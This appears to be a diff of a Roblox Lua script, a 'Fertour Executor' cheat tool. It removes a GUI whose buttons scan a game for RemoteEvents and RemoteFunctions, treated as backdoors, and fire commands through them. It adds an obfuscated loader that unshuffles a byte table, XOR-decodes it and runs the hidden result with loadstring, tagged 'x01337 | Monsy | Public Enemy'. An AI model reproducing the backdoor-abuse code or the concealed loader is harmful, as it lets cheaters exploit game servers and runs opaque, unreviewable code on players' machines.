-					end
-				else
-					sendNotification("Fertour Executor", "No RemoteEvents or RemoteFunctions found", 5)
-				end
-			end
-		},
-		{
-			Name = "Clear",
-			Action = function()
-				UsernameBox.Text = ""
-			end
-		},
-		{
-			Name = "Reset Character",
-			Action = function()
-				if LocalPlayer.Character then
-					LocalPlayer.Character:BreakJoints()
-				end
-			end
-		},
-		{
-			Name = "Body Type Switch",
-			Action = function()
-				isR15 = not isR15
-				local targetBodyType = isR15 and "R15" or "R6"
-				local command = "setBodyType " .. targetBodyType
-				local backdoors = scanForBackdoors()
-				if #backdoors > 0 then
-					for _, backdoor in ipairs(backdoors) do
-						sendNotification("Fertour Executor", "Switching to " .. targetBodyType .. " via: " .. backdoor.Name, 5)
-						pcall(function()
-							if backdoor:IsA("RemoteEvent") then
-								backdoor:FireServer(command)
-							elseif backdoor:IsA("RemoteFunction") then
-								backdoor:InvokeServer(command)
-							end
-						end)
-					end
-				else
-					sendNotification("Fertour Executor", "No RemoteEvents or RemoteFunctions found for body type switch", 5)
-				end
-			end
-		}
-	}
- 
-	-- Create bottom buttons
-	local buttonWidth = 110
-	local buttonHeight = 36
-	local spacing = 8
-	local startX = 10
-	local bottomY = MainFrame.AbsoluteSize.Y - buttonHeight - 10
- 
-	for i, info in ipairs(bottomButtons) do
-		local btn = Instance.new("TextButton")
-		btn.Size = UDim2.new(0, buttonWidth, 0, buttonHeight)
-		btn.Position = UDim2.new(0, startX + (i - 1) * (buttonWidth + spacing), 0, bottomY)
-		btn.Text = info.Name
-		btn.Font = Enum.Font.GothamBold
-		btn.TextSize = 18
-		btn.TextWrapped = true
-		btn.Parent = MainFrame
-		styleButton(btn)
-		btn.MouseButton1Click:Connect(function()
-	playClickSound(btn)
-	info.Action(btn)
-end)
-		btn.ZIndex = 3
-	end
+for zOJ16xtWW=#OHbexH26XUeqz6r3,1,-1 do
+  s__nf9pc=OHbexH26XUeqz6r3[zOJ16xtWW]
+  local BqiDmd=IjnMu4DpUvD5ui[s__nf9pc[1]]
+  IjnMu4DpUvD5ui[s__nf9pc[1]]=IjnMu4DpUvD5ui[s__nf9pc[2]]
+  IjnMu4DpUvD5ui[s__nf9pc[2]]=BqiDmd
 end
- 
--- Load GUI
-loadMainGui()
--- Toggle Button (Open / Close)
-local ToggleGui = Instance.new("ScreenGui")
-ToggleGui.Name = "Fertour_Toggle"
-ToggleGui.Parent = PlayerGui
-ToggleGui.ResetOnSpawn = false
- 
-local ToggleButton = Instance.new("TextButton")
-ToggleButton.Size = UDim2.new(0, 80, 0, 30)
-ToggleButton.Position = UDim2.new(1, -90, 0, 10) -- top-right
-ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-ToggleButton.BorderColor3 = Color3.fromRGB(255, 0, 0)
-ToggleButton.BorderSizePixel = 2
-ToggleButton.Text = "CLOSE"
-ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-ToggleButton.Font = Enum.Font.GothamBold
-ToggleButton.TextSize = 14
-ToggleButton.Parent = ToggleGui
- 
--- TOGGLE BUTTON
-local ToggleGui = Instance.new("ScreenGui")
-ToggleGui.Name = "Fertour_Toggle"
-ToggleGui.Parent = PlayerGui
-ToggleGui.ResetOnSpawn = false
- 
-local ToggleButton = Instance.new("TextButton")
-ToggleButton.Size = UDim2.new(0,80,0,30)
-ToggleButton.Position = UDim2.new(1,-90,0,10)
-ToggleButton.Text = "CLOSE"
-ToggleButton.BackgroundColor3 = Color3.new(0,0,0)
-ToggleButton.BorderColor3 = Color3.fromRGB(255,0,0)
-ToggleButton.BorderSizePixel = 2
-	ToggleButton.TextColor3 = Color3.new(1,1,1)
-ToggleButton.Font = Enum.Font.GothamBold
-ToggleButton.TextSize = 14
-ToggleButton.Parent = ToggleGui
- 
-local toggleSound = Instance.new("Sound", ToggleButton)
-toggleSound.SoundId = "rbxassetid://7593297942"
-toggleSound.Volume = 1
- 
-local open = true
-ToggleButton.MouseButton1Click:Connect(function()
-	toggleSound:Play()
-	open = not open
-	if PlayerGui:FindFirstChild("FertourExecutor") then
-		PlayerGui.FertourExecutor.Enabled = open
-	end
-	ToggleButton.Text = open and "CLOSE" or "OPEN"
-end)
+local M9IU27etJi6umi={}
+for zOJ16xtWW=1,#IjnMu4DpUvD5ui do
+  M9IU27etJi6umi[zOJ16xtWW]=string.char(bit32.bxor(IjnMu4DpUvD5ui[zOJ16xtWW],dClJ5idt2HVcf[(zOJ16xtWW-1)%#dClJ5idt2HVcf+1]))
+end
+local tnBblCVCDD=table.concat(M9IU27etJi6umi)
+if false then local KS9O36py=math.random() end
+local ZdEF1CxJ=nil
+local zOZyNJh1DR,S2Q7C6D1=loadstring(tnBblCVCDD)
+if zOZyNJh1DR then
+  zOZyNJh1DR()
+else
+  error(" x01337 | // @ Monsy | Public Enemy : "..tostring(S2Q7C6D1))
+end
